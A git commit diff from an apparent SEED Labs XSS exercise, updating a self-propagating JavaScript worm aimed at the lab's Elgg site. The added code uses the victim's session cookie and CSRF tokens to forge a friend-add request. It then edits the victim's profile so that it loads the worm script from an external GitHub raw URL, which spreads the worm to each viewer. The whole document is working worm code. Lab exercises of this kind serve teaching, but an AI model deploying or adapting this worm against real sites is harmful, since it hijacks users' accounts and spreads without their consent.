89ba4c4006b91f1bfa496649ab57d2475d0e53a7
gnuttt <gt93cc@gmail.com>
2018-06-10 13:30:21 +0800

    self-propagating-worm.js

--- mySeedLab/XSS/self-propagating-worm.js
+++ mySeedLab/XSS/self-propagating-worm.js
@@ -4,8 +4,19 @@ var user = elgg.session.user.username;
 if(user!='hackbiji'){
     var victim = null;
     victim = new XMLHttpRequest();
-    if(victim == null)
-        alert("victim is null");
+    victim.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"43"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
+    victim.setRequestHeader("Host","www.xsslabelgg.com");
+	victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
+    victim.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
+    victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+user);
+    victim.setRequestHeader("Cookie",document.cookie);
+    victim.setRequestHeader("Connection","keep-alive");
+    victim.send();    
+
+    victim = null;
+    victim = new XMLHttpRequest();
     victim.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
     victim.setRequestHeader("Host","www.xsslabelgg.com");
     victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
@@ -23,7 +34,7 @@ if(user!='hackbiji'){
     var content="__elgg_token=".concat(elgg.security.token.__elgg_token);
     content = content.concat("&__elgg_ts=").concat(elgg.security.token.__elgg_ts);
     content = content.concat("&name=").concat(user);
-    content = content.concat("&&briefdescription=<script id='worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/worm.js'></script>").concat(sub_script);
+    content = content.concat("&&briefdescription=<script id='worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/self-propagating-worm.js'></script>").concat(sub_script);
     content = content.concat("&guid=").concat(elgg.session.user.guid);
 
     victim.setRequestHeader("Content-Length",content.length);
